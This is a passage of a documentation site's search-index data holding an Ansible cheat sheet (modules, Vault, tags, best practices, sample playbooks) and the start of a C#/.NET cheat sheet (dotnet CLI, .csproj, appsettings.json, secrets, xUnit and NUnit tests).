line\n  lineinfile:\n    path: /etc/hosts\n    regexp: '^192\\.168\\.1\\.100'\n    state: absent\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#ansiblebuiltinblockinfile","title":"ansible.builtin.blockinfile","text":"<pre><code>- name: Add configuration block\n  blockinfile:\n    path: /etc/hosts\n    block: |\n      192.168.1.10 web01\n      192.168.1.11 web02\n      192.168.1.20 db01\n    marker: \"# {mark} ANSIBLE MANAGED BLOCK\"\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#package-management","title":"Package Management","text":""},{"location":"cheat-sheet/ansible/ansible/#ansiblebuiltinapt-debianubuntu","title":"ansible.builtin.apt (Debian/Ubuntu)","text":"<pre><code>- name: Install package\n  apt:\n    name: nginx\n    state: present\n    update_cache: yes\n\n- name: Install multiple packages\n  apt:\n    name:\n      - nginx\n      - php\n      - mysql-server\n    state: present\n\n- name: Update all packages\n  apt:\n    name: \"*\"\n    state: latest\n    update_cache: yes\n\n- name: Remove package\n  apt:\n    name: apache2\n    state: absent\n    purge: yes\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#ansiblebuiltindnfyum-redhatcentos","title":"ansible.builtin.dnf/yum (RedHat/CentOS)","text":"<pre><code>- name: Install package\n  dnf:\n    name: httpd\n    state: present\n\n- name: Install specific version\n  dnf:\n    name: httpd-2.4.6\n    state: present\n\n- name: Update all packages\n  dnf:\n    name: \"*\"\n    state: latest\n\n- name: Remove package\n  dnf:\n    name: httpd\n    state: absent\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#service-management","title":"Service Management","text":"<pre><code>- name: Start service\n  service:\n    name: nginx\n    state: started\n\n- name: Stop service\n  service:\n    name: nginx\n    state: stopped\n\n- name: Restart service\n  service:\n    name: nginx\n    state: restarted\n\n- name: Reload service\n  service:\n    name: nginx\n    state: reloaded\n\n- name: Enable at boot\n  service:\n    name: nginx\n    enabled: yes\n\n- name: Start and enable\n  service:\n    name: nginx\n    state: started\n    enabled: yes\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#user-and-group-management","title":"User and Group Management","text":"<pre><code>- name: Create user\n  user:\n    name: johnd\n    uid: 1040\n    group: admin\n    groups: docker,sudo\n    shell: /bin/bash\n    create_home: yes\n    password: \"{{ 'password' | password_hash('sha512') }}\"\n\n- name: Remove user\n  user:\n    name: johnd\n    state: absent\n    remove: yes\n\n- name: Generate SSH key\n  user:\n    name: jsmith\n    generate_ssh_key: yes\n    ssh_key_bits: 4096\n\n- name: Create group\n  group:\n    name: developers\n    gid: 1050\n    state: present\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#command-execution","title":"Command Execution","text":"<pre><code>- name: Simple command\n  command: /usr/bin/mycommand arg1 arg2\n\n- name: With working directory\n  command:\n    cmd: ls -la\n    chdir: /tmp\n\n- name: Don't execute if file exists\n  command: /usr/bin/create_file\n  args:\n    creates: /path/to/file\n\n- name: Shell with pipes\n  shell: ls -l | grep log\n\n- name: Script with environment variables\n  shell: mycommand\n  environment:\n    PATH: \"/custom/path:{{ ansible_env.PATH }}\"\n    DB_PASSWORD: \"{{ db_password }}\"\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#git","title":"Git","text":"<pre><code>- name: Clone repository\n  git:\n    repo: 'https://github.com/user/repo.git'\n    dest: /opt/myapp\n    version: main\n\n- name: Update to specific tag\n  git:\n    repo: 'https://github.com/user/repo.git'\n    dest: /opt/myapp\n    version: v1.2.3\n    force: yes\n\n- name: Clone with authentication\n  git:\n    repo: 'https://{{ github_token }}@github.com/user/private-repo.git'\n    dest: /opt/myapp\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#ansible-vault-encryption","title":"Ansible Vault (Encryption)","text":""},{"location":"cheat-sheet/ansible/ansible/#vault-commands","title":"Vault Commands","text":"<pre><code># Create encrypted file\nansible-vault create secrets.yml\n\n# Edit encrypted file\nansible-vault edit secrets.yml\n\n# Encrypt existing file\nansible-vault encrypt vars.yml\n\n# Decrypt file\nansible-vault decrypt vars.yml\n\n# View encrypted file content\nansible-vault view secrets.yml\n\n# Change password\nansible-vault rekey secrets.yml\n\n# Encrypt string\nansible-vault encrypt_string 'secret_password' --name 'db_password'\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#using-in-playbooks","title":"Using in Playbooks","text":"<pre><code># vars/secrets.yml (encrypted)\n---\ndb_password: secret123\napi_key: abc123xyz\n\n# playbook.yml\n- hosts: all\n  vars_files:\n    - vars/secrets.yml\n  tasks:\n    - name: Use secret\n      debug:\n        msg: \"Password: {{ db_password }}\"\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#executing-with-vault","title":"Executing with Vault","text":"<pre><code># Ask for password\nansible-playbook site.yml --ask-vault-pass\n\n# Use password file\nansible-playbook site.yml --vault-password-file ~/.vault_pass\n\n# With multiple vault IDs\nansible-playbook site.yml --vault-id prod@prompt --vault-id dev@~/.vault_dev\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#tags","title":"Tags","text":""},{"location":"cheat-sheet/ansible/ansible/#definition-and-usage_1","title":"Definition and Usage","text":"<pre><code>- name: Server configuration\n  hosts: all\n  tasks:\n    - name: Install packages\n      apt:\n        name: nginx\n        state: present\n      tags:\n        - packages\n        - nginx\n\n    - name: Configure application\n      template:\n        src: config.j2\n        dest: /etc/app/config.conf\n      tags:\n        - configuration\n        - app\n\n    - name: Start services\n      service:\n        name: nginx\n        state: started\n      tags:\n        - services\n        - nginx\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#executing-with-tags","title":"Executing with Tags","text":"<pre><code># Execute only tasks with a tag\nansible-playbook site.yml --tags configuration\n\n# Execute multiple tags\nansible-playbook site.yml --tags \"packages,services\"\n\n# Skip certain tags\nansible-playbook site.yml --skip-tags configuration\n\n# List all available tags\nansible-playbook site.yml --list-tags\n\n# Special tags\nansible-playbook site.yml --tags always    # Always executed\nansible-playbook site.yml --tags never     # Never executed\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#best-practices","title":"Best Practices","text":""},{"location":"cheat-sheet/ansible/ansible/#recommended-project-structure","title":"Recommended Project Structure","text":"<pre><code>production/\n  ansible.cfg\n  inventory/\n    production\n    staging\n  group_vars/\n    all.yml\n    webservers.yml\n    dbservers.yml\n  host_vars/\n    web01.example.com.yml\n  roles/\n    common/\n    webserver/\n    database/\n  playbooks/\n    site.yml\n    webservers.yml\n    dbservers.yml\n  vars/\n    common.yml\n    secrets.yml\n  files/\n  templates/\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#general-principles","title":"General Principles","text":"<ol> <li> <p>Always name plays and tasks <pre><code># \u2705 Good\n- name: Install and configure Nginx\n  hosts: webservers\n  tasks:\n    - name: Install Nginx\n      apt: name=nginx state=present\n\n# \u274c Bad\n- hosts: webservers\n  tasks:\n    - apt: name=nginx state=present\n</code></pre></p> </li> <li> <p>Use modules instead of commands <pre><code># \u2705 Good\n- name: Create directory\n  file:\n    path: /opt/app\n    state: directory\n\n# \u274c Bad\n- name: Create directory\n  command: mkdir -p /opt/app\n</code></pre></p> </li> <li> <p>Make playbooks idempotent <pre><code># \u2705 Good - Idempotent\n- name: Ensure file exists\n  file:\n    path: /tmp/file\n    state: touch\n    modification_time: preserve\n    access_time: preserve\n\n# \u274c Bad - Not idempotent\n- name: Create file\n  command: touch /tmp/file\n</code></pre></p> </li> <li> <p>Use Ansible Vault for secrets <pre><code># Encrypt sensitive files\nansible-vault encrypt group_vars/production/vault.yml\n\n# Never commit secrets in clear text\necho \"vault.yml\" &gt;&gt; .gitignore\n</code></pre></p> </li> <li> <p>Test before deploying <pre><code># Syntax check\nansible-playbook site.yml --syntax-check\n\n# Dry run\nansible-playbook site.yml --check --diff\n\n# Linter\nansible-lint site.yml\n</code></pre></p> </li> <li> <p>Document and comment <pre><code># Document roles in README.md\n# Comment complex code\n- name: Complex configuration\n  # This task configures XYZ because...\n  template:\n    src: complex.j2\n    dest: /etc/app/config.conf\n</code></pre></p> </li> <li> <p>Use version control <pre><code>git init\ngit add .\ngit commit -m \"Initial Ansible setup\"\n</code></pre></p> </li> </ol>"},{"location":"cheat-sheet/ansible/ansible/#practical-examples_1","title":"Practical Examples","text":""},{"location":"cheat-sheet/ansible/ansible/#lamp-deployment","title":"LAMP Deployment","text":"<pre><code>---\n- name: Deploy LAMP stack\n  hosts: webservers\n  become: yes\n\n  vars:\n    mysql_root_password: \"{{ vault_mysql_root_password }}\"\n\n  tasks:\n    - name: Install packages\n      apt:\n        name:\n          - apache2\n          - mysql-server\n          - php\n          - libapache2-mod-php\n          - php-mysql\n          - python3-pymysql\n        state: present\n        update_cache: yes\n\n    - name: Start and enable Apache\n      service:\n        name: apache2\n        state: started\n        enabled: yes\n\n    - name: Configure MySQL root password\n      mysql_user:\n        name: root\n        password: \"{{ mysql_root_password }}\"\n        login_unix_socket: /var/run/mysqld/mysqld.sock\n\n    - name: Deploy site\n      copy:\n        src: files/index.php\n        dest: /var/www/html/index.php\n        owner: www-data\n        group: www-data\n        mode: '0644'\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#system-update","title":"System Update","text":"<pre><code>---\n- name: System update\n  hosts: all\n  become: yes\n  serial: 2  # 2 servers at a time\n\n  tasks:\n    - name: Update APT cache\n      apt:\n        update_cache: yes\n      when: ansible_facts['os_family'] == \"Debian\"\n\n    - name: Update all packages\n      apt:\n        name: \"*\"\n        state: latest\n      when: ansible_facts['os_family'] == \"Debian\"\n\n    - name: Check if reboot is required\n      stat:\n        path: /var/run/reboot-required\n      register: reboot_required\n\n    - name: Reboot server\n      reboot:\n        msg: \"Reboot for system update\"\n        reboot_timeout: 300\n      when: reboot_required.stat.exists\n\n    - name: Wait for server to be ready\n      wait_for_connection:\n        delay: 60\n        timeout: 300\n      when: reboot_required.stat.exists\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#resources","title":"Resources","text":"<ul> <li>Official documentation: https://docs.ansible.com/</li> <li>Ansible Galaxy: https://galaxy.ansible.com/</li> <li>Ansible Lint: https://ansible-lint.readthedocs.io/</li> <li>Best Practices: https://docs.ansible.com/ansible/latest/user_guide/playbooks_best_practices.html</li> <li>Community: https://www.ansible.com/community</li> </ul> <p>This Ansible guide covers essential and advanced concepts to effectively automate the management of your infrastructures. Mastering these practices will allow you to manage your servers in a reproducible and reliable manner.</p>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/","title":"C# &amp; .NET - Cheat Sheet","text":""},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#net-ecosystem-overview","title":".NET Ecosystem Overview","text":"<p>.NET is a cross-platform development platform for building web, desktop, mobile, cloud, IoT, and gaming applications.</p> <p>Main versions:</p> <ul> <li>.NET Framework (Windows only, legacy)</li> <li>.NET Core (cross-platform, deprecated)</li> <li>.NET 6/\u215e/9+ (modern, cross-platform, LTS every 2 years)</li> </ul>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#dotnet-cli-essential-commands","title":"dotnet CLI - Essential Commands","text":""},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#project-management","title":"Project Management","text":"<pre><code># Create a new solution\ndotnet new sln -n MySolution\n\n# Create different types of projects\ndotnet new console -n MyApp                  # Console application\ndotnet new classlib -n MyLibrary            # Class library\ndotnet new web -n MyApi                     # Minimal Web API\ndotnet new webapi -n MyApi                  # Web API with controllers\ndotnet new mvc -n MyMvcApp                  # MVC application\ndotnet new blazorserver -n MyBlazorApp      # Blazor Server application\ndotnet new xunit -n MyTests                 # xUnit test project\ndotnet new nunit -n MyTests                 # NUnit test project\ndotnet new mstest -n MyTests                # MSTest test project\n\n# List available templates\ndotnet new list\n\n# Add a project to a solution\ndotnet sln add MyApp/MyApp.csproj\n\n# Add a project reference\ndotnet add MyApp/MyApp.csproj reference MyLibrary/MyLibrary.csproj\n\n# Remove a project from the solution\ndotnet sln remove MyApp/MyApp.csproj\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#build-and-execution","title":"Build and Execution","text":"<pre><code># Restore dependencies\ndotnet restore\n\n# Build the project/solution\ndotnet build\ndotnet build --configuration Release\ndotnet build -c Release --no-restore\n\n# Clean build artifacts\ndotnet clean\n\n# Run the application\ndotnet run\ndotnet run --project MyApp/MyApp.csproj\ndotnet run --configuration Release\n\n# Run with arguments\ndotnet run -- arg1 arg2 --option=value\n\n# Watch mode (automatic rebuild)\ndotnet watch run\ndotnet watch test\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#publishing","title":"Publishing","text":"<pre><code># Publish the application\ndotnet publish -c Release -o ./publish\n\n# Publish as self-contained (includes runtime)\ndotnet publish -c Release -r win-x64 --self-contained\ndotnet publish -c Release -r linux-x64 --self-contained\ndotnet publish -c Release -r osx-x64 --self-contained\n\n# Publish as framework-dependent (requires .NET installed)\ndotnet publish -c Release -r win-x64 --self-contained false\n\n# Publish as single-file\ndotnet publish -c Release -r win-x64 -p:PublishSingleFile=true\n\n# Publish with trimming (size reduction)\ndotnet publish -c Release -r linux-x64 -p:PublishTrimmed=true\n\n# Publish as AOT (Ahead-of-Time compilation, .NET 7+)\ndotnet publish -c Release -r linux-x64 -p:PublishAot=true\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#nuget-package-management","title":"NuGet Package Management","text":"<pre><code># Add a NuGet package\ndotnet add package Newtonsoft.Json\ndotnet add package Microsoft.EntityFrameworkCore --version 8.0.0\n\n# Remove a package\ndotnet remove package Newtonsoft.Json\n\n# List packages\ndotnet list package\ndotnet list package --outdated\ndotnet list package --vulnerable\n\n# Restore packages\ndotnet restore\n\n# Update packages\ndotnet add package PackageName\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#csproj-file","title":".csproj File","text":"<p>The <code>.csproj</code> (C# Project) file defines the project configuration.</p>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#basic-structure-modern-net","title":"Basic Structure (modern .NET)","text":"<pre><code>&lt;Project Sdk=\"Microsoft.NET.Sdk\"&gt;\n\n  &lt;PropertyGroup&gt;\n    &lt;OutputType&gt;Exe&lt;/OutputType&gt;\n    &lt;TargetFramework&gt;net8.0&lt;/TargetFramework&gt;\n    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;\n    &lt;Nullable&gt;enable&lt;/Nullable&gt;\n  &lt;/PropertyGroup&gt;\n\n&lt;/Project&gt;\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#common-properties","title":"Common Properties","text":"<pre><code>&lt;Project Sdk=\"Microsoft.NET.Sdk\"&gt;\n\n  &lt;PropertyGroup&gt;\n    &lt;!-- Output type --&gt;\n    &lt;OutputType&gt;Exe&lt;/OutputType&gt;              &lt;!-- Exe, Library, WinExe --&gt;\n\n    &lt;!-- Target framework --&gt;\n    &lt;TargetFramework&gt;net8.0&lt;/TargetFramework&gt;\n    &lt;!-- Multi-targeting --&gt;\n    &lt;TargetFrameworks&gt;net6.0;net8.0&lt;/TargetFrameworks&gt;\n\n    &lt;!-- C# language version --&gt;\n    &lt;LangVersion&gt;12.0&lt;/LangVersion&gt;           &lt;!-- latest, preview, 12.0, 11.0 --&gt;\n\n    &lt;!-- Nullable reference types --&gt;\n    &lt;Nullable&gt;enable&lt;/Nullable&gt;                &lt;!-- enable, disable, warnings --&gt;\n\n    &lt;!-- Implicit usings --&gt;\n    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;\n\n    &lt;!-- Assembly info --&gt;\n    &lt;AssemblyName&gt;MyApplication&lt;/AssemblyName&gt;\n    &lt;RootNamespace&gt;MyApplication&lt;/RootNamespace&gt;\n    &lt;Version&gt;1.0.0&lt;/Version&gt;\n    &lt;AssemblyVersion&gt;1.0.0.0&lt;/AssemblyVersion&gt;\n    &lt;FileVersion&gt;1.0.0.0&lt;/FileVersion&gt;\n\n    &lt;!-- Package metadata --&gt;\n    &lt;PackageId&gt;MyPackage&lt;/PackageId&gt;\n    &lt;Authors&gt;Your Name&lt;/Authors&gt;\n    &lt;Company&gt;Your Company&lt;/Company&gt;\n    &lt;Product&gt;Your Product&lt;/Product&gt;\n    &lt;Description&gt;Package description&lt;/Description&gt;\n    &lt;Copyright&gt;Copyright \u00a9 2025&lt;/Copyright&gt;\n    &lt;PackageLicenseExpression&gt;MIT&lt;/PackageLicenseExpression&gt;\n    &lt;PackageProjectUrl&gt;https://github.com/user/repo&lt;/PackageProjectUrl&gt;\n    &lt;RepositoryUrl&gt;https://github.com/user/repo&lt;/RepositoryUrl&gt;\n    &lt;RepositoryType&gt;git&lt;/RepositoryType&gt;\n    &lt;PackageTags&gt;tag1;tag2;tag3&lt;/PackageTags&gt;\n\n    &lt;!-- Build options --&gt;\n    &lt;GenerateDocumentationFile&gt;true&lt;/GenerateDocumentationFile&gt;\n    &lt;TreatWarningsAsErrors&gt;true&lt;/TreatWarningsAsErrors&gt;\n    &lt;WarningsAsErrors&gt;CS8600;CS8602&lt;/WarningsAsErrors&gt;\n    &lt;NoWarn&gt;CS1591&lt;/NoWarn&gt;\n\n    &lt;!-- Publishing --&gt;\n    &lt;PublishSingleFile&gt;true&lt;/PublishSingleFile&gt;\n    &lt;SelfContained&gt;true&lt;/SelfContained&gt;\n    &lt;RuntimeIdentifier&gt;win-x64&lt;/RuntimeIdentifier&gt;\n    &lt;PublishTrimmed&gt;true&lt;/PublishTrimmed&gt;\n    &lt;PublishReadyToRun&gt;true&lt;/PublishReadyToRun&gt;\n  &lt;/PropertyGroup&gt;\n\n&lt;/Project&gt;\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#nuget-package-references","title":"NuGet Package References","text":"<pre><code>&lt;ItemGroup&gt;\n  &lt;PackageReference Include=\"Newtonsoft.Json\" Version=\"13.0.3\" /&gt;\n  &lt;PackageReference Include=\"Microsoft.EntityFrameworkCore\" Version=\"8.0.0\" /&gt;\n  &lt;PackageReference Include=\"Serilog\" Version=\"3.1.1\" /&gt;\n\n  &lt;!-- With specific options --&gt;\n  &lt;PackageReference Include=\"Moq\" Version=\"4.20.70\"&gt;\n    &lt;PrivateAssets&gt;all&lt;/PrivateAssets&gt;\n    &lt;IncludeAssets&gt;runtime; build; native; contentfiles; analyzers&lt;/IncludeAssets&gt;\n  &lt;/PackageReference&gt;\n&lt;/ItemGroup&gt;\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#project-references","title":"Project References","text":"<pre><code>&lt;ItemGroup&gt;\n  &lt;ProjectReference Include=\"..\\MyLibrary\\MyLibrary.csproj\" /&gt;\n  &lt;ProjectReference Include=\"..\\Shared\\Shared.csproj\" /&gt;\n&lt;/ItemGroup&gt;\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#files-to-includeexclude","title":"Files to Include/Exclude","text":"<pre><code>&lt;ItemGroup&gt;\n  &lt;!-- Include specific files --&gt;\n  &lt;None Include=\"appsettings.json\" CopyToOutputDirectory=\"PreserveNewest\" /&gt;\n  &lt;None Include=\"data\\*.json\" CopyToOutputDirectory=\"Always\" /&gt;\n\n  &lt;!-- Embedded content --&gt;\n  &lt;EmbeddedResource Include=\"Resources\\**\\*\" /&gt;\n\n  &lt;!-- Exclude files --&gt;\n  &lt;Compile Remove=\"OldCode\\**\" /&gt;\n  &lt;EmbeddedResource Remove=\"OldCode\\**\" /&gt;\n  &lt;None Remove=\"OldCode\\**\" /&gt;\n&lt;/ItemGroup&gt;\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#complete-example-web-api","title":"Complete Example - Web API","text":"<pre><code>&lt;Project Sdk=\"Microsoft.NET.Sdk.Web\"&gt;\n\n  &lt;PropertyGroup&gt;\n    &lt;TargetFramework&gt;net8.0&lt;/TargetFramework&gt;\n    &lt;Nullable&gt;enable&lt;/Nullable&gt;\n    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;\n    &lt;GenerateDocumentationFile&gt;true&lt;/GenerateDocumentationFile&gt;\n    &lt;NoWarn&gt;$(NoWarn);1591&lt;/NoWarn&gt;\n    &lt;UserSecretsId&gt;aspnet-MyApi-12345&lt;/UserSecretsId&gt;\n  &lt;/PropertyGroup&gt;\n\n  &lt;ItemGroup&gt;\n    &lt;PackageReference Include=\"Microsoft.AspNetCore.OpenApi\" Version=\"8.0.0\" /&gt;\n    &lt;PackageReference Include=\"Swashbuckle.AspNetCore\" Version=\"6.5.0\" /&gt;\n    &lt;PackageReference Include=\"Microsoft.EntityFrameworkCore.SqlServer\" Version=\"8.0.0\" /&gt;\n    &lt;PackageReference Include=\"Serilog.AspNetCore\" Version=\"8.0.0\" /&gt;\n  &lt;/ItemGroup&gt;\n\n  &lt;ItemGroup&gt;\n    &lt;ProjectReference Include=\"..\\MyApi.Core\\MyApi.Core.csproj\" /&gt;\n    &lt;ProjectReference Include=\"..\\MyApi.Infrastructure\\MyApi.Infrastructure.csproj\" /&gt;\n  &lt;/ItemGroup&gt;\n\n&lt;/Project&gt;\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#configuration-appsettingsjson","title":"Configuration - appsettings.json","text":""},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#basic-structure","title":"Basic Structure","text":"<pre><code>{\n  \"Logging\": {\n    \"LogLevel\": {\n      \"Default\": \"Information\",\n      \"Microsoft.AspNetCore\": \"Warning\"\n    }\n  },\n  \"AllowedHosts\": \"*\"\n}\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#complete-configuration","title":"Complete Configuration","text":"<pre><code>{\n  \"Logging\": {\n    \"LogLevel\": {\n      \"Default\": \"Information\",\n      \"Microsoft\": \"Warning\",\n      \"Microsoft.Hosting.Lifetime\": \"Information\",\n      \"System\": \"Warning\"\n    },\n    \"Console\": {\n      \"IncludeScopes\": true,\n      \"LogLevel\": {\n        \"Default\": \"Debug\"\n      }\n    }\n  },\n\n  \"ConnectionStrings\": {\n    \"DefaultConnection\": \"Server=localhost;Database=MyDb;User Id=sa;Password=P@ssw0rd;TrustServerCertificate=True\",\n    \"RedisConnection\": \"localhost:6379,password=redis123\"\n  },\n\n  \"AppSettings\": {\n    \"JwtSecret\": \"YourVeryLongAndSecureSecretKey\",\n    \"JwtExpirationDays\": 7,\n    \"ApiUrl\": \"https://api.example.com\",\n    \"MaxUploadSizeInMb\": 10\n  },\n\n  \"EmailSettings\": {\n    \"SmtpServer\": \"smtp.gmail.com\",\n    \"SmtpPort\": 587,\n    \"SenderEmail\": \"noreply@example.com\",\n    \"SenderName\": \"My Application\",\n    \"EnableSsl\": true\n  },\n\n  \"Cors\": {\n    \"AllowedOrigins\": [\n      \"https://localhost:4200\",\n      \"https://example.com\"\n    ]\n  },\n\n  \"FeatureFlags\": {\n    \"EnableNewFeature\": false,\n    \"EnableBetaFeatures\": true\n  },\n\n  \"AllowedHosts\": \"*\"\n}\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#configuration-hierarchy","title":"Configuration Hierarchy","text":"<pre><code>appsettings.json                      (Base)\n  \u2193 (override)\nappsettings.Development.json          (Environment-specific)\n  \u2193 (override)\nappsettings.{Environment}.json        (Production, Staging, etc.)\n  \u2193 (override)\nUser Secrets (development)\n  \u2193 (override)\nEnvironment Variables\n  \u2193 (override)\nCommand-line arguments\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#usage-in-c","title":"Usage in C","text":"<p>1. Strongly-typed configuration with IOptions:</p> <pre><code>// Configuration class\npublic class AppSettings\n{\n    public string JwtSecret { get; set; } = string.Empty;\n    public int JwtExpirationDays { get; set; }\n    public string ApiUrl { get; set; } = string.Empty;\n    public int MaxUploadSizeInMb { get; set; }\n}\n\n// Program.cs\nbuilder.Services.Configure&lt;AppSettings&gt;(\n    builder.Configuration.GetSection(\"AppSettings\")\n);\n\n// Injection in a service\npublic class MyService\n{\n    private readonly AppSettings _settings;\n\n    public MyService(IOptions&lt;AppSettings&gt; options)\n    {\n        _settings = options.Value;\n    }\n\n    public void DoSomething()\n    {\n        var url = _settings.ApiUrl;\n        var maxSize = _settings.MaxUploadSizeInMb;\n    }\n}\n</code></pre> <p>2. Direct access via IConfiguration:</p> <pre><code>public class MyService\n{\n    private readonly IConfiguration _configuration;\n\n    public MyService(IConfiguration configuration)\n    {\n        _configuration = configuration;\n    }\n\n    public void DoSomething()\n    {\n        // Simple read\n        var logLevel = _configuration[\"Logging:LogLevel:Default\"];\n\n        // Read with default value\n        var maxSize = _configuration.GetValue&lt;int&gt;(\"AppSettings:MaxUploadSizeInMb\", 10);\n\n        // Read ConnectionString\n        var connString = _configuration.GetConnectionString(\"DefaultConnection\");\n\n        // Read section\n        var emailSettings = _configuration.GetSection(\"EmailSettings\");\n        var smtpServer = emailSettings[\"SmtpServer\"];\n    }\n}\n</code></pre> <p>3. Bind to an object:</p> <pre><code>var emailSettings = new EmailSettings();\nbuilder.Configuration.GetSection(\"EmailSettings\").Bind(emailSettings);\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#user-secrets-development","title":"User Secrets (development)","text":"<pre><code># Initialize secrets\ndotnet user-secrets init\n\n# Add a secret\ndotnet user-secrets set \"AppSettings:JwtSecret\" \"my-secret-key\"\ndotnet user-secrets set \"ConnectionStrings:DefaultConnection\" \"Server=...\"\n\n# List secrets\ndotnet user-secrets list\n\n# Remove a secret\ndotnet user-secrets remove \"AppSettings:JwtSecret\"\n\n# Clear all secrets\ndotnet user-secrets clear\n</code></pre> <p>Storage: <code>~/.microsoft/usersecrets/{UserSecretsId}/secrets.json</code></p>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#environment-variables","title":"Environment Variables","text":"<pre><code># Linux/macOS\nexport AppSettings__JwtSecret=\"my-key\"\nexport ConnectionStrings__DefaultConnection=\"Server=...\"\n\n# Windows (PowerShell)\n$env:AppSettings__JwtSecret=\"my-key\"\n$env:ConnectionStrings__DefaultConnection=\"Server=...\"\n\n# Windows (CMD)\nset AppSettings__JwtSecret=my-key\n</code></pre> <p>Note: Use <code>__</code> (double underscore) for nested sections.</p>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#tests","title":"Tests","text":""},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#xunit-most-popular","title":"xUnit (most popular)","text":"<p>Installation:</p> <pre><code>dotnet new xunit -n MyTests\ndotnet add package xunit\ndotnet add package xunit.runner.visualstudio\ndotnet add package Microsoft.NET.Test.Sdk\n</code></pre> <p>Test Examples:</p> <pre><code>using Xunit;\n\npublic class CalculatorTests\n{\n    [Fact]\n    public void Addition_TwoNumbers_ReturnsCorrectResult()\n    {\n        // Arrange\n        var calculator = new Calculator();\n\n        // Act\n        var result = calculator.Add(2, 3);\n\n        // Assert\n        Assert.Equal(5, result);\n    }\n\n    [Theory]\n    [InlineData(2, 3, 5)]\n    [InlineData(0, 0, 0)]\n    [InlineData(-1, 1, 0)]\n    [InlineData(10, -5, 5)]\n    public void Addition_DifferentValues_ReturnsCorrectResult(\n        int a, int b, int expected)\n    {\n        // Arrange\n        var calculator = new Calculator();\n\n        // Act\n        var result = calculator.Add(a, b);\n\n        // Assert\n        Assert.Equal(expected, result);\n    }\n\n    [Fact]\n    public void Division_ByZero_ThrowsException()\n    {\n        // Arrange\n        var calculator = new Calculator();\n\n        // Act &amp; Assert\n        Assert.Throws&lt;DivideByZeroException&gt;(() =&gt;\n            calculator.Divide(10, 0)\n        );\n    }\n\n    [Fact]\n    public async Task GetUser_WithValidId_ReturnsUser()\n    {\n        // Arrange\n        var service = new UserService();\n\n        // Act\n        var user = await service.GetUserAsync(1);\n\n        // Assert\n        Assert.NotNull(user);\n        Assert.Equal(\"John\", user.Name);\n    }\n}\n</code></pre> <p>Common Assertions:</p> <pre><code>// Equality\nAssert.Equal(expected, actual);\nAssert.NotEqual(expected, actual);\n\n// Null\nAssert.Null(obj);\nAssert.NotNull(obj);\n\n// Booleans\nAssert.True(condition);\nAssert.False(condition);\n\n// Collections\nAssert.Empty(collection);\nAssert.NotEmpty(collection);\nAssert.Contains(item, collection);\nAssert.DoesNotContain(item, collection);\nAssert.Collection(collection,\n    item =&gt; Assert.Equal(\"a\", item),\n    item =&gt; Assert.Equal(\"b\", item)\n);\n\n// Strings\nAssert.StartsWith(\"Hello\", text);\nAssert.EndsWith(\"World\", text);\nAssert.Contains(\"middle\", text);\nAssert.Matches(@\"\\d{3}\", text); // Regex\n\n// Exceptions\nAssert.Throws&lt;InvalidOperationException&gt;(() =&gt; method());\nvar ex = Assert.Throws&lt;ArgumentException&gt;(() =&gt; method());\nAssert.Equal(\"paramName\", ex.ParamName);\n\n// Types\nAssert.IsType&lt;string&gt;(obj);\nAssert.IsAssignableFrom&lt;IEnumerable&gt;(obj);\n\n// Ranges\nAssert.InRange(value, low, high);\nAssert.NotInRange(value, low, high);\n</code></pre>"},{"location":"cheat-sheet/csharp-dotnet/csharp-dotnet/#nunit","title":"NUnit","text":"<pre><code>dotnet add package NUnit\ndotnet add package NUnit3TestAdapter\ndotnet add package Microsoft.NET.Test.Sdk\n</code></pre> <pre><code>using NUnit.Framework;\n\n[TestFixture]\npublic class CalculatorTests\n{\n    private Calculator _calculator;\n\n    [SetUp]\n    public void Setup()\n    {\n        _calculator = new Calculator();\n    }\n\n    [Test]\n    public void Addition_TwoNumbers_ReturnsCorrectResult()\n    {\n        var result = _calculator.Add(2, 3);\n        Assert.That(result, Is.EqualTo(5));\n    }\n\n    [TestCase(2, 3, 5)]\n    [TestCase(0, 0, 0)]\n    [TestCase(-1, 1, 0)]\n    